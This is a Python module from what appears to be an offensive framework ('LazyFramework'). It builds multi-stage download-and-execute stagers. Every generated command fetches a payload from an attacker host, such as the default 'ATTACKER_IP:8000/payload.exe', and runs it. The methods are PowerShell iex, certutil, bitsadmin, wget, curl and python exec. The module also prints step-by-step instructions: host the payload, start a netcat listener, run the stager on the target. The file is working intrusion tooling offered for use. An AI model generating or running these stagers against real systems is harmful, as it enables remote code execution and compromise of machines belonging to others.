# /root/lazy1/modules/payloads/reverse/advanced/stager_tcp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Stager Reverse TCP",
    "description": "Multi-stage reverse shell with download and execute capabilities",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Multi",
    "arch": "Multi",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "lhost": {
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "description": "Listener port",
        "required": True,
        "default": "4444"
    },
    "platform": {
        "description": "Target platform",
        "required": False,
        "default": "windows",
        "choices": ["windows", "linux", "multi"]
    },
    "method": {
        "description": "Stager method",
        "required": False,
        "default": "powershell",
        "choices": ["powershell", "certutil", "wget", "curl", "python", "bitsadmin"]
    },
    "payload_url": {
        "description": "URL to download final payload",
        "required": False,
        "default": "http://ATTACKER_IP:8000/payload.exe"
    }
}

def generate_stager_reverse(lhost, lport, platform="windows", method="powershell", payload_url=""):
    """Generate multi-stage reverse shell stager"""
    
    if not payload_url:
        payload_url = f"http://{lhost}:8000/payload.exe"
    
    if platform == "windows":
        if method == "powershell":
            return f'''powershell -c "iex (New-Object Net.WebClient).DownloadString('{payload_url}')"'''
        
        elif method == "certutil":
            return f'''cmd /c certutil -urlcache -split -f {payload_url} payload.exe && payload.exe'''
        
        elif method == "bitsadmin":
            return f'''bitsadmin /transfer myjob /download /priority normal {payload_url} %TEMP%\\payload.exe && %TEMP%\\payload.exe'''
    
    else:  # linux/multi
        if method == "wget":
            return f'''wget -q {payload_url} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload'''
        
        elif method == "curl":
            return f'''curl -s {payload_url} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload'''
        
        elif method == "python":
            return f'''python -c "import urllib2; exec(urllib2.urlopen('{payload_url}').read())"'''
    
    return f"Download and execute: {payload_url}"

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = options.get("lport", "4444")
    platform = options.get("platform", "windows")
    method = options.get("method", "powershell")
    payload_url = options.get("payload_url", f"http://{lhost}:8000/payload.exe")
    
    console.print("\n[bold green]🎯 Stager Reverse TCP[/bold green]")
    console.print("=" * 50)
    
    stager = generate_stager_reverse(lhost, lport, platform, method, payload_url)
    
    console.print(f"\n[bold]Stager Type:[/bold] Multi-stage download & execute")
    console.print(f"[bold]Platform:[/bold] {platform}")
    console.print(f"[bold]Method:[/bold] {method}")
    console.print(f"[bold]Payload URL:[/bold] {payload_url}")
    
    console.print(f"\n[bold yellow]📦 Stager Command:[/bold yellow]")
    console.print(Panel(stager, border_style="cyan"))
    
    console.print(f"\n[bold green]🚀 Setup Instructions:[/bold green]")
    console.print("1. Host your final payload at the specified URL")
    console.print("2. Start your listener")
    console.print("3. Execute the stager command on target")
    console.print("4. Stager will download and execute final payload")
    
    console.print(f"\n[bold blue]📡 Hosting Payload:[/bold blue]")
    console.print(f"Python HTTP server: python -m http.server 8000")
    console.print(f"Or use: php -S {lhost}:8000")
    
    console.print(f"\n[bold red]🎧 Listener:[/bold red] nc -lnvp {lport}")
    
    return stager
